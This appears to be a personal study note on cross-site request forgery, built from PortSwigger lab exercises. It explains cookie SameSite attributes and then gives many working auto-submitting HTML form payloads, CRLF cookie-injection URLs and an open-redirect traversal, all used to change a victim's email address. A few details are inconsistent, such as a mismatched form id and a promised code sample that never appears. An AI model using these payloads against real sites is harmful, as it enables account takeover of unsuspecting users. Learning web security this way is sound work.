![image](https://beren-obsidian-images.imgix.net/55b8ef0ccfe6008d650bc2a1c363934c.webp)
### *What is CSRF?*
CSRF (cross-site-request-forgery) is making requests from an external domain controlled by an attacker to execute functions for a victim on a website. The attacker crafts a server to host a similar website or script that automatically calls an endpoint for a vulnerable website that a victim has an account on, then uses the server to complete actions not intended by the victim.
### *Different cookie settings*
It is important to understand the difference between cookie settings and attributes to determine if a website is vulnerable to a CSRF attack:
#### SameSite
- **Strict**: Cookies are only sent in first-party contexts and are not accessible when visiting another website.
- **Lax**: Cookies are accessible when following a link from another site but not when submitting forms.
- **None**: Cookies are accessible from any context, including third-party websites.

> **LAX + POST (120s)**: If a website has not set the `SameSite` attribute for a cookie. Chrome will automatically set the `SameSite` attribute to LAX. Chrome doesn't enforce the Lax restrictions for the first 120 seconds on top-level POST requests to avoid breaking single sign-on mechanisms. This creates a two-minute window in which users may be susceptible to cross-site attacks.
#### Secure
- The `Secure` attribute ensures that the cookie is sent only over HTTPS, providing a layer of security against man-in-the-middle attacks.
#### HttpOnly
- This setting prevents the cookie from being accessed via JavaScript, offering protection against cross-site scripting (XSS) attacks which can otherwise access cookies and exploit them for malicious purposes.
#### Expiration and Max-Age Attributes
- `Expiration` sets a specific date and time for when the cookie will expire, while `Max-Age` sets the duration in seconds.
### *Examples of attacks*
A variety of simple attacks would include setting up an exploit server that hosts html or scripts to make a request to the vulnerable website that makes a change to a user's account.
#### *Bypassing cross-origin requests*
Create a form from the Burp-Suite CSRF PoC generator, hosted on a server that submits to the vulnerable endpoint:
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form id="form" action="https://vulnerable-website.com/change-email" method="POST">
      <input type="hidden" name="email" value="csrf&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById('form').submit();
    </script>
  </body>
</html>
```

The `history.pushState` function is ensuring the malicious page's URL endpoint is set to '/' to avoid suspicion while keeping the PoC on a unique endpoint to ensure crawlers do not scrape the page or interact with the PoC.

The form is automatically submitted with `document.getElementById('autoSubmitForm').submit()`. If the victim has a current session cookie, it will use that to change their email to the attacker's email.

> Check to see if you can bypass the CSRF token validation by omitting the value entirely.
****
> Check to see if you can use your own CSRF token that was generated for you, and use that value to test for CSRF of another user.
#### *When a CSRF token is not tied to a session*
If the CSRF token uses a separate value that is not tied to a session cookie and you can make arbitrary requests on their behalf by simply using their session cookie instead of yours, and you can also set the cookie that contains the CSRF key value to yours, then you can make malicious requests on behalf of the user.

This website also contains a reflected XSS vulnerability that sets a cookie from user input, crafting this URL will set a user controlled cookie in the browser. `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`

The attacker can craft and host the following:
```
<form id="myForm" action="https://vulnerable-website.com/my-account/change-email" method="post">   
	<input type="hidden" name="email" value="attacker@gmail.com">   
	//attackers CSRF token
	<input type="hidden" name="csrf" value="LHFti01j2MlMSxp1P2G6WBzAgiQrumUD"> 
</form>  

<img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=o1qVFLOfmFtHZsNaP9SARJwXRWOG9grb%3b%20SameSite=None" onerror="document.forms[0].submit()" />
```

**Duplicated cookie**
If the cookie for the CSRF token is the same on the form it means that is being duplicated, and if you can change the value of the cookie containing the CSRF token, then change the cookie to be the same as the one on the form, also try and match the format, example:
```
<html>
  <body>
<img src="https://vulnerable-website/?search=term%0d%0aSet-Cookie:%20csrf=1%3b%20SameSite=None" onerror="document.forms[0].submit()" />
  <script>history.pushState('', '', '/')</script>
    <form action="https://0abc006b03bc2c99859460e5001f00ba.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@email.com" />
      <input type="hidden" name="csrf" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
#### *Method override for GET request when `SameSite` is set to `Lax`*
When trying to perform a CSRF exploit you can override the request method, here is a list of methods to do such: [[Method override methods]]

Usually sensitive functions like updating user account details use POST requests and send the information in the body. If the vulnerable website is using a CSRF token to verify POST requests, you may be able to bypass the verification with a GET request:
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form id="autoSubmitForm" action="https://vulnerable-website.com/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="csrf&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById('autoSubmitForm').submit();
    </script>
  </body>
</html>
```

In this example I have added the `<input type="hidden" name="_method" value="GET" />` element to override the form, this is taking advantage of an XSS to edit arbitrary headers in the victim's request, setting the CSRF token to the value of `1` in both places to bypass the CSRF token check.
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
  <img src="https://vulnerable-website.com/?search=term%0d%0aSet-Cookie:%20csrf=1%3b%20SameSite=None" onerror="document.forms[0].submit()" />
<form action="https://0a84001303902cd285e3ddd700b200ff.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@normal-user.net" />
    <input type="hidden" name="csrf" value="1" />
    <input type="hidden" name="_method" value="GET" />
    <button type="submit">Submit</button>
</form>
</body>
</html>
```
#### *Using two accounts to detect if CSRF token cookie is tied to session cookie*
Create two accounts on the target website. Log in with the first user, and check to see if modifying the CSRF token in the cookies results in being logged out. If modifying the token does not log you out, you may be able to use that CSRF token for the second user when executing sensitive functions.

To escalate this vulnerability, I found a search functionality that does not sanitize user input, and uses that input to set a cookie in your browser; `https://vulnerable-website.com/?search=test` this search parameter's value will be set as; `LastSearchTerm=test`. This will be vulnerable to breaking out and setting arbitrary headers. The following payload will set my current CSRF token to be the victim's, taking advantage of the CSRF token not being tied to the session token:
```
/?search=term%0d%0aSet-Cookie:%20csrfKey=j4wmHRgXySlbhb4Has0Kc5koyZpSNpwI%3b%20SameSite=None
```

The following is an exploit hosted on a server to execute the change email functionality. First, it will set the attacker's cookie into the victim's browser through the unsanitized search functionality, via an `<img>` tag that will error out after sending the request, then it will submit the form through the `onerror` function which will send a POST request to the change email endpoint, updating the victim's email to the attacker's chosen value.
```
<html>
<img src="https://vulnerable-website.com/?search=term%0d%0aSet-Cookie:%20csrfKey=j4wmHRgXySlbhb4Has0Kc5koyZpSNpwI%3b%20SameSite=None" onerror="document.forms[0].submit()" />
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ab100be03bcba7c845a4583002c000c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="PWNED2&#64;email&#46;com" />
      <input type="hidden" name="csrf" value="YHW4zvcquBMBQLUzkDjk2II6hCUDEcTx" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
#### *Bypass `Refferer` header with `Refferer-Policy: no-referrer`*
As stated in the title, if a web application is blocking a cross-site request due to the `Refferer` header being set to an invalid domain not recognized by the server, then you can bypass by setting the `Refferer-Policy: no-referrer` header in the request.
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: no-referrer

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://vulnerable-website.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker&#64;email.com" />
      <input type="submit" value="Submit request" />
    </form>
<script>
document.forms[0].submit();
</script>
  </body>
</html>
```
#### *Bypass `SameSite=strict` with open redirect*
With this example, there is an open redirect vulnerability once a user has submitted a comment on a blog page, that runs this function:
```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

The `blogPath` parameter is user controllable through this parameter, which is the URL that you are directed to after submitting a comment on a blog page.
```
https://vulnerable-website.com/post/comment/confirmation?postId=USERCONTROLLED
```

You can craft a URL that exploits this redirect to change the victims email address, this is URL encoded, and for some reason it cuts off at the `&` symbol, so I had to add one extra at the end, this is using document.location to do a top-level navigation:
```
<script>
document.location = "https://vulnerable-website.com/post/comment/confirmation?postId=%2E%2E%2F%2E%2E%2Fmy%2Daccount%2Fchange-email%3Femail%3Dattacker%40email.com%26submit%3D1&"
</script>
```

This URL will traverse back to `https://vulnerable-website.com` and add the endpoint to change a user's email `my-account/change-email?email=pwned545@gmail.com&submit=1` with the `submit=1` parameter automatically submitting the form.
#### *Bypass `SameSite=Lax` via cookie refresh*
As mentioned here: [[#SameSite]]. There is a 120s window to perform POST requests cross-site when the developer has not explicitly set a cookie's `SameSite` value. The cookie is then by default set to: `SameSite=Lax`. This is the standard behavior for chrome, but other browsers may differ.

In this scenario, there is an OAuth authentication flow, this is one of the last GET requests to the OAuth server: `https://oauth-0a8b005f03e0848780d4519802200007.oauth-server.net/auth?client_id=aa8vm9jmyoz5qscwuqhn1&redirect_uri=https://0a5a002a037d84f780035315000a000f.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email`

The URL is making a GET request to the OAuth server to update the user's session cookie. Because of the previously stated default `SameSite=Lax` options, after this request has been made, there will be a 120s window to perform a cross-site POST request. This code hosted on an exploit server will perform an unauthenticated POST request to change the victim's email address

### *Can CSRF tokens prevent XSS attacks?*
Some XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability that can be trivially exploited like this:
```
https://vulnerable-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
```

Now, suppose that the vulnerable function includes a CSRF token:
```
https://vulnerable-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>
```

Assuming that the server properly validates the CSRF token, and rejects requests without a valid token, then the token does prevent exploitation of the XSS vulnerability. The clue here is in the name: "cross-site scripting", at least in its reflected form, involves a cross-site request. By preventing an attacker from forging a cross-site request, the application prevents trivial exploitation of the XSS vulnerability.

Some important caveats arise here:
- If a reflected XSS vulnerability exists anywhere else on the site within a function that is not protected by a CSRF token, then that XSS can be exploited in the normal way.
- If an exploitable XSS vulnerability exists anywhere on a site, then the vulnerability can be leveraged to make a victim perform actions even if those actions are themselves protected by CSRF tokens. In this situation, the attacker's script can request the relevant page to obtain a valid CSRF token, and then use the token to perform the protected action.
- CSRF tokens do not protect against [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerabilities. If a page that is protected by a CSRF token is also the output point for a stored XSS vulnerability, then that XSS vulnerability can be exploited in the usual way, and the XSS payload will execute when a user visits the page.
### *Resources*
- https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
- https://owasp.org/www-community/attacks/csrf
- [Content security policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [bypass-samesite-cookies-default-to-lax-and-get-csrf](https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b)
- [120 second POST window for SameSite=Lax](https://chromestatus.com/feature/5088147346030592)